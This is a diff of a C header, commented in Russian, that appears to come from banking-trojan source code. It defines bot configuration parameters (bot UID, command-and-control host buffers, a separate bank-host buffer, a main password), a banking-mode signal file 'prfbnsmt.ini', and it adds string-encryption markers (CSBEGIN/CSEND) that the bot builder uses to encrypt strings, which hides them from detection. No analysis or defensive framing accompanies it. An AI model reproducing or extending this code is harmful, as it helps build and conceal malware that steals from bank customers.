@@ -62,19 +62,28 @@
 #define MAX_PREFIX_SIZE        20  /* Размер буфера для префикса бота */
 #define MAX_DELAY_SIZE         8   /* Буфер для хранения задержки */
 #define MAX_BOT_PLUG_NAME_SIZE 100 /* Буфер для хранения имени ботплага */
+#define MAX_STRINGS_PASSW_SIZE 10  /* Размер буфера хранения пароля шифрования строк */
 
-
-#define DEFAULT_DELAY  10 /* Задержка по умолчанию */
 
 
 // Имена параметров
 
-#define BOTPARAM_PREFIX       "BOT_UID"
-#define BOTPARAM_MAINHOSTS    "ALL_HOSTS_BUFFER\0\0"
-#define BOTPARAM_BANKHOSTS    "CAB_HOSTS_BUFFER\0\0"
-#define BOTPARAM_DELAY        "DELAY_"
-#define BOTPARAM_MAINPASSWORD "MAIN_PASSWORD"
-#define BOTPARAM_PLUG_NAME    "PLUG_NAME"
+#define BOTPARAM_PREFIX        "BOT_UID"
+#define BOTPARAM_MAINHOSTS     "ALL_HOSTS_BUFFER\0\0"
+#define BOTPARAM_BANKHOSTS     "CAB_HOSTS_BUFFER\0\0"
+#define BOTPARAM_DELAY         "DELAY_"
+#define BOTPARAM_MAINPASSWORD  "MAIN_PASSWORD"
+#define BOTPARAM_PLUG_NAME     "PLUG_NAME"
+#define BOTPARAM_STRINGS_PASSW "ESTR_PASS_"
+
+
+
+// Маркеры начала и окончания блока шифрованных строк
+// Билдер бота найдёт первое вхождение маркера начала
+// и зашифрует все строки до маркера окончания
+#define ENCRYPTED_STRINGS_BEGIN "CSBEGIN"
+#define ENCRYPTED_STRINGS_END   "CSEND"
+
 
 
 //Хэши имён параметров
@@ -97,12 +106,18 @@
 	#define BOTPARAM_ENCRYPTED_PASSWORD  false
 #endif
 
+
+#define DEFAULT_DELAY  10 /* Задержка по умолчанию */
+
+
 //--------------------------------------------------------
 //  Им сигнального файла режима Банк
 //  Если файл с таким именем будет лежать в директории
 //  Application Data...дополнить коментарий
 //--------------------------------------------------------
-const static char BANKING_SIGNAL_FILE[] = {'p','r','f','b','n','s','m','t','.','i','n','i', 0};
+#ifdef USE_BANKING_PREFIX
+	const static char BANKING_SIGNAL_FILE[] = {'p','r','f','b','n','s','m','t','.','i','n','i', 0};
+#endif
 const DWORD BANKING_SIGNAL_FILE_HASH = 0x2709A4B5; /* prfbnsmt.ini */
 
 
@@ -161,6 +176,9 @@ string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encry
 // Функция возвращает пароль для криптования принимаемых/отправляемых данных
 PCHAR GetMainPassword(bool NotNULL = false);
 string GetMainPassword2(bool NotNULL = false);
+
+// Функция возвращает указатель на пароль для шифрования строк
+PCHAR GetStringsPassword();
 
 //------------------------------------------------------------------------
 //  GetBotScriptURL - Функция возвращает полный адрес указанного скрипта
